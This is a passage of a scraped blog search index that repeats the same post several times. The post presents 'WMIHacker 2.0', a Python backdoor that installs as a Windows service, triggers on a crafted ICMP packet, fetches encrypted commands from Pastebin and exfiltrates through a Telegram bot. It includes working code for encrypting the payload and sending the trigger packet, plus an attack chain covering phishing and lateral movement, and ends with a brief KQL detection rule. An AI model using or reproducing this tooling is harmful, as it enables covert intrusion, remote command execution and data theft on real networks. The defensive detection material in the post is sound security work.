in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\n!\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\n![PoC TG2]\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 